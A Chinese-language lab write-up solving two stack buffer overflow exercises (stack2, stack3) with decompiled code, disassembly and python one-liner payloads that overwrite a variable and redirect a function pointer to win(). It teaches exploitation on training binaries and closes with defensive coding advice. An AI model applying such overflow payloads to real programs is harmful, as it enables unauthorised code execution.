# <center>栈溢出实验2</center>

## 实验概述

### 【目的】
1. 运行stack2，获得输出`you have correctly modified the variable`
2. 运行stack3，获得输出`code flow successfully changed`
### 【环境】
Linux
### 【工具】
python,IDA pro
### 【原理】
缓冲区溢出（buffer overflow），是针对程序设计缺陷，向程序输入缓冲区写入使之溢出的内容（通常是超过缓冲区能保存的最大数据量的数据），从而破坏程序运行、趁著中断之际并获取程序乃至系统的控制权。
## 实验步骤

### 【步骤】

#### stack2

```
$ binwalk stack2

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             ELF, 32-bit LSB executable, Intel 80386, version 1 (SYSV)
```
打开IDA进行分析。
```c#
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char dest; // [sp+8h] [bp-50h]@3
  int v5; // [sp+48h] [bp-10h]@3
  char *src; // [sp+4Ch] [bp-Ch]@1

  src = getenv("GREENIE");
  if ( !src )
    errx(1, "please set the GREENIE environment variable\n");
  v5 = 0;
  strcpy(&dest, src);
  if ( v5 == 218762506 )
    puts("you have correctly modified the variable");
  else
    printf("Try again, you got 0x%08x\n", v5);
  return 0;
}
```
跟实验一的stack1差不多，我们可以发现危险函数`strcpy(&dest, src);`
这里要控制src变量的值，需要自定义环境变量GREENIE，在Linux中，使用 `export 变量=值`
可以改变当前环境变量的值，于是有：
```
lometsj@ubuntu:~/prostar$ export GREENIE=`python -c 'print "A"*64 + "\x0a\x0d\x0a\x0d"'`
lometsj@ubuntu:~/prostar$ echo $GREENIE
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
lometsj@ubuntu:~/prostar$ ./stack2
you have correctly modified the variable

```

#### stack3
```
$ binwalk stack3

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             ELF, 32-bit LSB executable, Intel 80386, version 1 (SYSV)

```

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [sp+Ch] [bp-4Ch]@1
  void (*v5)(void); // [sp+4Ch] [bp-Ch]@1

  v5 = 0;
  gets(&s);
  if ( v5 )
  {
    printf("calling function pointer, jumping to 0x%08x\n", v5);
    v5();
  }
  return 0;
}
int win()
{
  return puts("code flow successfully changed");
}
```
```
.text:0804846B                 public win
.text:0804846B win             proc near
.text:0804846B                 push    ebp
.text:0804846C                 mov     ebp, esp
.text:0804846E                 sub     esp, 8
.text:08048471                 sub     esp, 0Ch
.text:08048474                 push    offset s        ; "code flow successfully changed"
.text:08048479                 call    _puts
.text:0804847E                 add     esp, 10h
.text:08048481                 nop
.text:08048482                 leave
.text:08048483                 retn
.text:08048483 win             endp
```
可以发现危险函数`gets(&s);`,观察可以发现，当v5不为0时，程序会跳转到v5指向的地址执行，这里我们把v5指向函数`int win()`的地址，可以得到输出`code flow successfully changed`。

```
$ python -c "print 'a'*64 + '\x6b\x84\x04\x08'" | ./stack3
calling function pointer, jumping to 0x0804846b
code flow successfully changed

```
可以看到我们通过溢出成功跳转到了win函数执行代码。
### 【总结】
这次实验通过栈溢出简单的熟悉了Linux下环境变量的设置和c语言的函数指针，需要注意的是，通过export设置的环境变量只对当前终端有效。
可以发现，要使栈溢出发生，要满足以下条件：

- 程序允许用户输入
- 程序对用户的输入长度不加检查

栈溢出攻击是最为普遍而又危害极大的漏洞，要防御栈溢出攻击，首先要有良好的编码功力，对于用户的输入数据要做严格的长度检查，避免使用危险的函数。

